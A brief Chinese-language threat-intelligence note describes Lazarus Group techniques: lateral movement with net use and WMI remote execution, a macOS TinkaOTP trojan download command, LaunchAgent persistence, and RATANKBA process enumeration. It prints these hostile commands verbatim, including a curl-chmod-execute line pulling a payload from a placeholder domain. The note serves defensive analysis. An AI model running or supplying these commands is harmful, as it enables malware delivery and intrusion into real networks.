# Lazarus Group

## 特征

1. 横向移动时会使用:net use \\[IP地址]\IPC$ "[密码]" /u:"[用户名]" > $temp\~tmp5936t.tmp 2>&1"命令与远程主机建立网络连接，然后会使用WMI将恶意软件复制到远程主机.

```bash
wmic.exe /node:[IP地址] /user:"[用户名]" /password:"[密码]" PROCESS CALL CREATE "cmd.exe /c $appdata\Adobe\adobe.bat"
wmic.exe /node:[IP地址] /user:"[用户名]" /password:"[密码]" PROCESS CALL CREATE "cmd /c sc queryex helpsvc > $temp\tmp001.dat"
```

2. 针对MacOS系统的TinkaOTP木马两个变体都是伪装成.nib文件的Mach-O二进制文件，其中第二个版本则没有携带payload，而是将其C2地址嵌入到TinkaOTP包的主要执行文件中，通过命令：curl -k -o ~/Library/.mina https://域名/wp-content/uploads/2020/01/images.tgz.001 > /dev/null 2>&1 && chmod +x ~/Library/.mina > /dev/null 2>&1 && ~/Library/.mina > /dev/null 2>&1，下载Payload.
而后，TinkaOTP木马通过/LaunchAgents/com.aex-loop.agent.plist和/Library/LaunchDaemons/com.aex-loop.agent.plist来维持持久.

3. RATANKBA后门会使用WMI收集受感染主机的运行进程、命令行、会话ID信息将其发送到C2服务器.

```bash
"C:\Windows\system32\cmd.exe" /c "wmic process get processid,commandline,sessionid | findstr SysWOW"
"C:\Windows\system32\cmd.exe" /c "wmic process get processid,commandline,sessionid | findstr x86"
//显示运行进程、命令行、会话ID
```
